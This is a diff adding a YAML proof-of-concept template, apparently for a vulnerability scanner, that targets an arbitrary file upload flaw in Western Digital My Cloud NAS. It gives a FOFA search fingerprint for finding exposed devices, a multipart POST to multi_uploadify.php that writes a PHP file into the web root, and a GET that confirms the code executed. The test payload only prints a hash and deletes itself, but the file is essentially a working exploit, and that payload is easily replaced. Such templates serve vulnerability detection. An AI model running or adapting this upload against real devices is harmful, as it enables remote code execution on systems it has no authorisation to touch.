@@ -1,0 +1,31 @@
+id: poc-yaml-western-digital-my-cloud-nas-multi-uploadify-php-anyfile-upload
+info:
+  name: Western Digital My Cloud NAS multi_uploadify.php 任意文件上传漏洞
+  severity: critical
+  tags:
+  - 文件上传
+  finger: my_cloud_nas
+  fofa: icon_hash="-1074357885" && header="PHP/5.4.16"
+variables:
+  t1: random_int(1000,10000)
+  t2: md5(t1)
+requests:
+- method: POST
+  path: /web/jquery/uploader/multi_uploadify.php?folder=/var/www/
+  headers:
+    Content-Type: multipart/form-data; boundary=----WebKitFormBoundary
+  data: '------WebKitFormBoundary
+
+    Content-Disposition: form-data; name="Filedata[]"; filename="{{.t1}}.php"
+
+    Content-Type: application/octet-stream
+
+
+    <?=md5({{.t1}});unlink(__FILE__);
+
+    ------WebKitFormBoundary--'
+  expression: status_code == 302 && body == ""
+- method: GET
+  path: /{{.t1}}.php
+  expression: status_code == 200 && body == t2
+transport: http
